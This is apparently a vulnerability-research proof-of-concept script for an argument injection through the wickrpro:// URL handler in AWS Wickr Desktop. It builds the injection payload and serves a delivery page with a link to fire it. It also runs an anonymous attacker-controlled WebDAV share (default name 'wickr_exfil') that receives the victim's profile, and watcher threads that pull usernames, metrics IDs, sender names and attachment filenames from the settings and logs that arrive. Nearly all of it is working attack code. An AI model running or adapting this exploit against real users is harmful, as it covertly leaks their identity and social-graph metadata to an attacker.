#!/usr/bin/env python3
"""
AWS Wickr Desktop 6.72.20.0 (Windows) — W37b gates #4 reproduction harness
==========================================================================

This is the REMOTE-VICTIM topology of the `wickrpro://` argument injection,
where the injected `--datalocation` points at an attacker-controlled **WebDAV
share** rather than a local path. It tests the one remaining gate in W37b that
was marked [I] (inferred, not measured):

    "WebDAV delivery is UNTESTED [I]. `\\host@SSL@443\\dav\\…` would make the
    directory remote and attacker-controlled; the WebClient service is present
    but Manual/trigger-start. SQLite over WebDAV may not work at all."
    -- W37b gates #4

Running this answers two open questions:

  1. Can wsgidav 4.x serve a WebDAV share that Windows WebClient (MRxDAV)
     will accept as `\\<host>@<port>\\DavWWWRoot\\<share>`?
  2. If so, does WickrPro.exe actually write its profile (`settings`,
     `logs/*.txt`, and critically `wickr_db.sqlite`) onto that remote share
     through the injected `--datalocation`?

Each answer falls out as measured — [M] (it works) or measured-DEAD (it does
not, with the reason). Both are reportable.

------------------------------------------------------------------------------
WHAT THIS IS, AND IS NOT, EXPECTED TO DEMONSTRATE
------------------------------------------------------------------------------
This harness carries the same honest scope as `repro_server.py`:

  * NOT RCE. No Chromium switch reaches QtWebEngine in any prefix form
    (initCommandLine drops app argv without a `--webEngineArgs` separator).
  * NOT credential capture. Auth resolves its own region via
    WickrMultiRegionRequest() and goes to the REAL backend.
  * NOT message bodies / attachment plaintext / key material. The DB and
    temp/attachments are encrypted at rest; `text`/`textContent`/`downloadUrl`
    are logged as KEYS ONLY, never with values.

What it CAN show, if WebDAV delivery works at all, is metadata + identity
disclosure (`last_successful_user`, social-graph fields, attachment filenames)
reaching an attacker across the network, with no local write primitive on the
victim. That is the actual W37b residual.

------------------------------------------------------------------------------
TOPOLOGY — two listeners in one process
------------------------------------------------------------------------------
  * --port        HTTP landing page (the link the victim clicks).  default 8099
  * --dav-port    WebDAV share exposing --dir as /<share>/.        default 8080
The watcher threads observe the local --dir backend; whatever the victim's
WickrPro writes through WebDAV lands there and is surfaced on the console.

Usage:
    python repro_webdav.py [--port 8099] [--dav-port 8080]
                           [--host <lan-ip>] [--share wickr_exfil]
                           [--dir <backend-dir-with-no-spaces>] [--log repro.log]

Preconditions (all measured for the injection half in W37; gates #4 specifics
for the WebDAV half are what this harness exists to test):
    * WickrPro.exe must NOT already be running on the victim.
    * Victim must accept the browser's external-protocol dialog.
    * WebClient service must be running on the victim (`Manual`/trigger-start
      by default; `Start-Service WebClient` or `net start WebClient`).
    * Anonymous access over plain HTTP — no TLS, no BasicAuthLevel registry
      tweak needed. If you later switch to Basic auth, set
      HKLM\\...\\WebClient\\Parameters\\BasicAuthLevel = 2 and restart WebClient.
    * Firewall on both ends must allow --port and --dav-port inbound to this host.
"""

import argparse
import html
import json
import os
import re
import socket
import sys
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from cheroot import wsgi
from wsgidav.fs_dav_provider import FilesystemProvider
from wsgidav.wsgidav_app import WsgiDAVApp

# --------------------------------------------------------------------------
# output
# --------------------------------------------------------------------------

LOCK = threading.Lock()
LOGFILE = None


def emit(tag, msg):
    line = f"[{datetime.now():%H:%M:%S}] {tag:<11} {msg}"
    with LOCK:
        print(line, flush=True)
        if LOGFILE:
            with open(LOGFILE, "a", encoding="utf-8") as f:
                f.write(line + "\n")


BANNER = r"""
================================================================================
 AWS Wickr Desktop  -  wickrpro:// argument injection  (W37b gates #4)
   CWE-88   argument injection via URL protocol handler
   CWE-532  sensitive information written to an attacker-controlled WebDAV share
   REMOTE-VICTIM topology. NOT RCE. NOT credential theft. NOT message content.
================================================================================
"""

# attachment filenames in the exposed logs may be non-ASCII (e.g. Japanese);
# a cp932/cp1252 console would otherwise abort the whole harness on the first one
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# --------------------------------------------------------------------------
# 1. delivery page
# --------------------------------------------------------------------------

PAGE = """<!doctype html>
<meta charset="utf-8">
<title>W37b gates #4 — wickrpro:// argument injection, WebDAV delivery</title>
<style>
 body{{font:15px/1.6 system-ui,sans-serif;max-width:900px;margin:40px auto;padding:0 20px;
      background:#10131a;color:#e6e9ef}}
 code,pre{{background:#171b24;border:1px solid #262c3a;border-radius:6px}}
 code{{padding:2px 6px}}
 pre{{padding:14px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;font-size:13px}}
 a.fire{{display:inline-block;margin:14px 0;padding:12px 20px;background:#7a1020;color:#fff;
        border-radius:8px;text-decoration:none;font-weight:700}}
 .note{{border-left:3px solid #c8a020;padding:8px 14px;margin:18px 0;color:#d8d2bd}}
 h1{{font-size:20px}} h2{{font-size:15px;color:#8fa0bd;text-transform:uppercase;
     letter-spacing:.06em;margin-top:28px}}
 .new{{border-left:3px solid #4a90d9;padding:8px 14px;margin:18px 0;color:#bcd6f0}}
</style>

<h1>W37b gates #4 — <code>wickrpro://</code> injection, WebDAV delivery</h1>

<p>This page is served from the attacker. The handler is registered as
<code>"…\\WickrPro.exe" "%1"</code>; <code>%1</code> is substituted <em>literally</em>
into a command line that Windows re-splits with <code>CommandLineToArgvW</code>, so
any token in the URL becomes a separate <code>argv</code> element. The opaque-path URL
form (<code>wickrpro:</code> with no <code>//</code>) survives the browser's URL
serialisation with quotes and spaces intact.</p>

<div class="new">
<b>This is the WebDAV topology.</b> The injected <code>--datalocation</code> points at
a UNC path backed by the attacker's WebDAV share — <em>not</em> a local directory. If
WickrPro honours it, the victim's profile is written across the network to the
attacker. This is W37b gates #4, previously marked [I] (untested).
</div>

<h2>Preconditions</h2>
<div class="note">
<b>Wickr must not already be running.</b> A live instance makes the shell suppress the
new process entirely and nothing is injected.<br>
The browser will show an external-protocol confirmation — it must be accepted.<br>
<b>WebClient service must be running</b> on this host (<code>Start-Service WebClient</code>
or <code>net start WebClient</code>). It is <code>Manual</code> / trigger-start by default.<br>
After launch the client shows a <b>blank profile</b>; a login is required for metadata
to start flowing.
</div>

<h2>Payload</h2>
<pre>{url_display}</pre>
<a class="fire" href="{url_attr}">Fire the protocol handler</a>

<h2>What the harness will print</h2>
<p>The injected <code>--datalocation</code> makes the client keep its profile at
<code>{datalocation_display}</code>, which this harness is serving over WebDAV and
watching on its backend. Settings and logs there are plaintext; the message database
and <code>temp/attachments</code> are encrypted.</p>

<h2>What this harness is testing</h2>
<ol>
 <li>Does wsgidav 4.x serve a share that Windows WebClient accepts as
     <code>\\host@port\\DavWWWRoot\\share</code>?</li>
 <li>If so, does WickrPro write its profile (especially <code>wickr_db.sqlite</code>)
     onto the WebDAV share? SQLite-over-WebDAV is the open question in W37b gates #4.</li>
</ol>
Either outcome is measured: [M] (works) or measured-DEAD (with the reason).

<h2>Measured negatives — do not claim these</h2>
<pre>no code execution      - no Chromium switch reaches QtWebEngine in any prefix form
no credential capture  - auth uses WickrMultiRegionRequest() -> the REAL backend
no message bodies      - "text"/"textContent" are logged as keys with no value
no attachment content  - temp/attachments entropy 7.91-7.9994 bits/byte
no download URLs       - "downloadUrl" is a key only; nothing is pre-signed</pre>
"""


def build_unc(host, dav_port, share):
    # UNC with explicit port via the @port form; DavWWWRoot is the literal token
    # Windows WebClient's mini-redirector (MRxDAV) recognises for WebDAV roots.
    return f"\\\\{host}@{dav_port}\\DavWWWRoot\\{share}"


def build_url(unc):
    # opaque-path form; the quote closes the shell's "%1" so the rest becomes argv
    return 'wickrpro:x" --datalocation ' + unc


def detect_lan_ip():
    """Best-effort LAN IP for the host the victim will resolve. UDP connect trick:
    no packet leaves; the OS picks the egress NIC's source address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "127.0.0.1"


# --------------------------------------------------------------------------
# 2. exposure watcher — observes the local backend the WebDAV share exposes
# --------------------------------------------------------------------------

SETTINGS_KEYS = [
    "last_successful_user", "last_attempted_user", "regionName", "regionBaseURL",
    "certPinningEnabled", "userMetricsID", "deviceMetricsID", "forceDeviceLockout",
    "failedLoginAttempts", "userVerificationFlow", "first_login", "downloads",
]

# fields proven to appear with real values in the plaintext [JS] bridge dumps
INTERESTING = re.compile(
    r'"(vGroupID|vgroupId|msgId|serverMessageId|senderUserName|senderHash|targetUsers|'
    r'name|mimetype|size|fileHash|guid|location|destructTime|ttl|timeStamp)"'
    r'\s*:\s*("(?:[^"\\]|\\.)*"|\d+|\[[^\]]*\])'
)


def watch_settings(datadir, stop):
    seen = {}
    while not stop.is_set():
        for root, _, files in os.walk(datadir):
            if "settings" in files:
                p = os.path.join(root, "settings")
                try:
                    mt = os.path.getmtime(p)
                    if seen.get(p) == mt:
                        continue
                    seen[p] = mt
                    with open(p, "r", encoding="utf-8", errors="replace") as f:
                        body = f.read()
                except OSError:
                    continue
                emit("SETTINGS", f"{os.path.relpath(p, datadir)} changed — cleartext values:")
                for k in SETTINGS_KEYS:
                    m = re.search(rf"(?m)^{re.escape(k)}=(.*)$", body)
                    if m:
                        emit("SETTINGS", f"    {k} = {m.group(1).strip()}")
        stop.wait(2)


def watch_logs(datadir, stop):
    """Tail every app log under the directory and surface the metadata fields."""
    offsets = {}
    while not stop.is_set():
        for root, _, files in os.walk(datadir):
            if os.path.basename(root) != "logs":
                continue
            for fn in files:
                if not fn.endswith(".txt") or "_npl" in fn:
                    continue
                p = os.path.join(root, fn)
                try:
                    size = os.path.getsize(p)
                    off = offsets.get(p, 0)
                    if size < off:            # rotated / truncated
                        off = 0
                    if size == off:
                        continue
                    with open(p, "r", encoding="utf-8", errors="replace") as f:
                        f.seek(off)
                        chunk = f.read()
                        offsets[p] = f.tell()
                except OSError:
                    continue
                for line in chunk.splitlines():
                    hits = INTERESTING.findall(line)
                    if not hits:
                        continue
                    fields = {}
                    for k, v in hits:
                        try:
                            fields[k] = json.loads(v)
                        except Exception:
                            fields[k] = v.strip('"')
                    # drop the empty ones so the stream stays readable
                    fields = {k: v for k, v in fields.items()
                              if v not in ("", None, [], 0)}
                    if fields:
                        emit("METADATA", json.dumps(fields, ensure_ascii=False))
        stop.wait(1)


def watch_arrivals(datadir, stop):
    """Surface every new file (and, critically, the SQLite header) so the WebDAV
    delivery question — "does WickrPro populate the share?" — has a clear answer."""
    seen = {}
    while not stop.is_set():
        for root, _, files in os.walk(datadir):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    size = os.path.getsize(p)
                    if seen.get(p) == size:
                        continue
                    prev = seen.get(p)
                    seen[p] = size
                    rel = os.path.relpath(p, datadir)
                    if prev is None:
                        magic = ""
                        try:
                            with open(p, "rb") as f:
                                head = f.read(16)
                            if head.startswith(b"SQLite format 3"):
                                magic = "  [SQLite header — DB opened over WebDAV]"
                            elif head[:4] in (b"\x89PNG", b"\xff\xd8\xff\xe0",
                                              b"\xff\xd8\xff\xe1", b"PK\x03\x04",
                                              b"%PDF"):
                                magic = "  [known magic — possible plaintext]"
                            elif head[:4] == b"\xa8\xaf\x69\x36":
                                magic = "  [wickr encrypted DB header]"
                        except OSError:
                            pass
                        emit("NEWFILE", f"{rel}  ({size} B){magic}")
                except OSError:
                    continue
        stop.wait(2)


# --------------------------------------------------------------------------
# 3. HTTP landing page (single endpoint; the WebDAV verbs live on a sibling port)
# --------------------------------------------------------------------------

class LandingHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "W37bWebDAV/1.0"
    url_display = ""
    url_attr = ""
    datalocation_display = ""

    def _send(self, body, ctype="text/html; charset=utf-8", code=200):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path in ("/", "/index.html"):
            emit("PAGE", f"served {path} to {self.client_address[0]}")
            self._send(PAGE.format(
                url_display=html.escape(self.url_display),
                url_attr=html.escape(self.url_attr, quote=True),
                datalocation_display=html.escape(self.datalocation_display)))
        else:
            self._send(json.dumps({"status": 200, "result": "success"}),
                       "application/json")

    def log_message(self, *a):
        pass


# --------------------------------------------------------------------------
# 4. WebDAV server — wsgidav + cheroot on a background thread
# --------------------------------------------------------------------------

def build_dav_config(datadir, share, dav_port):
    # Anonymous, plain-HTTP, Windows-WebClient-compatible configuration.
    # add_header_MS_Author_Via and the hotfixes are the wsgidav-recommended
    # knobs for Microsoft mini-redirector compatibility.
    return {
        "host": "0.0.0.0",
        "port": dav_port,
        "provider_mapping": {
            f"/{share}": FilesystemProvider(datadir, readonly=False, fs_opts={}),
        },
        "simple_dc": {"user_mapping": {"*": True}},   # anonymous access
        "add_header_MS_Author_Via": True,
        "hotfixes": {
            "emulate_win32_lastmod": True,
            "re_encode_path_info": True,
            "unquote_path_info": True,
        },
        "property_manager": True,
        "lock_storage": True,                          # SQLite may issue LOCKs
        "dir_browser": {"enable": True,
                        "ms_sharepoint_support": True},
        "verbose": 1,
        "logging": {"enable": True},
    }


def run_dav_server(config, ready_event):
    """Start cheroot serving WsgiDAVApp on a background thread."""
    app = WsgiDAVApp(config)
    bind = (config["host"], config["port"])
    server = wsgi.Server(bind_addr=bind, wsgi_app=app,
                         server_name="W37b-WebDAV", numthreads=50)
    ready_event.set()
    emit("WEBDAV", f"listening on {bind[0]}:{bind[1]}")
    try:
        server.start()
    except Exception as e:
        emit("WEBDAV", f"FATAL: {e!r}")
    finally:
        emit("WEBDAV", "stopped")


# --------------------------------------------------------------------------

def main():
    global LOGFILE
    here = os.path.dirname(os.path.abspath(__file__))
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8099,
                    help="HTTP landing-page port (the link the victim opens)")
    ap.add_argument("--dav-port", type=int, default=8080,
                    help="WebDAV share port")
    ap.add_argument("--host", default=None,
                    help="host the victim will resolve for the UNC share "
                         "(default: auto-detected LAN IP)")
    ap.add_argument("--share", default="wickr_exfil",
                    help="WebDAV share name (the last UNC component)")
    ap.add_argument("--dir", default=os.path.join(here, "wickr_exfil"),
                    help="local backend directory the WebDAV share exposes "
                         "(must contain no spaces)")
    ap.add_argument("--log", default=os.path.join(here, "repro_webdav.log"))
    args = ap.parse_args()

    datadir = os.path.abspath(args.dir)
    if " " in datadir:
        sys.exit("error: --dir must not contain spaces "
                 "(the shell re-splits argv on them)")
    os.makedirs(datadir, exist_ok=True)
    LOGFILE = args.log

    host = args.host or detect_lan_ip()
    unc = build_unc(host, args.dav_port, args.share)
    url = build_url(unc)

    LandingHandler.url_display = url
    LandingHandler.url_attr = url
    LandingHandler.datalocation_display = unc

    print(BANNER)
    emit("READY", f"page       http://{host}:{args.port}/index.html")
    emit("READY", f"webdav     http://{host}:{args.dav_port}/{args.share}/")
    emit("READY", f"unc        {unc}")
    emit("READY", f"backend    {datadir}")
    emit("READY", f"payload    {url}")
    emit("READY", "smoke test:  net use W: " + unc)
    emit("READY", "then click the link from the victim, with Wickr closed there too")

    stop = threading.Event()
    for fn in (watch_settings, watch_logs, watch_arrivals):
        threading.Thread(target=fn, args=(datadir, stop), daemon=True).start()

    # WebDAV on a background thread (foreground would block the HTTP server).
    dav_config = build_dav_config(datadir, args.share, args.dav_port)
    ready = threading.Event()
    threading.Thread(target=run_dav_server, args=(dav_config, ready), daemon=True).start()
    ready.wait(5)

    # HTTP landing page in the foreground; Ctrl-C tears everything down.
    http_srv = ThreadingHTTPServer(("0.0.0.0", args.port), LandingHandler)
    try:
        http_srv.serve_forever()
    except KeyboardInterrupt:
        emit("EXIT", "stopping")
        stop.set()
        http_srv.shutdown()


if __name__ == "__main__":
    main()
